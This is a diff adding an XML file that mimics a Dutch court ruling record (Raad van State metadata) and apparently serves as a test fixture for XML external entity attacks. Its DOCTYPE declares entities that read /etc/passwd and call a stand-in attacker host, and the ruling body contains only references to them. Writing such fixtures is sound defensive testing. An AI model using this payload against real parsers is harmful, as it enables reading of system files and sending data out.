@@ -1,0 +1,20 @@
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE open-rechtspraak [
+  <!ENTITY secret SYSTEM "file:///etc/passwd">
+  <!ENTITY remote SYSTEM "http://attacker.invalid/collect">
+]>
+<open-rechtspraak>
+  <rdf:RDF xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#" xmlns:dcterms="http://purl.org/dc/terms/" xmlns:rdfs="http://www.w3.org/2000/01/rdf-schema#" xmlns:psi="http://psi.rechtspraak.nl/">
+    <rdf:Description>
+      <dcterms:identifier>ECLI:NL:RVS:2024:9002</dcterms:identifier>
+      <dcterms:language>nl</dcterms:language>
+      <dcterms:creator rdfs:label="Instantie" resourceIdentifier="http://standaarden.overheid.nl/owms/terms/Raad_van_State">Raad van State</dcterms:creator>
+      <dcterms:date rdfs:label="Uitspraakdatum">2024-06-05</dcterms:date>
+      <dcterms:subject rdfs:label="Rechtsgebied">Bestuursrecht</dcterms:subject>
+    </rdf:Description>
+  </rdf:RDF>
+  <uitspraak id="ECLI:NL:RVS:2024:9002:DOC" lang="nl" xml:space="preserve" xmlns="http://www.rechtspraak.nl/schema/rechtspraak-1.0">
+    <para>&secret;</para>
+    <para>&remote;</para>
+  </uitspraak>
+</open-rechtspraak>
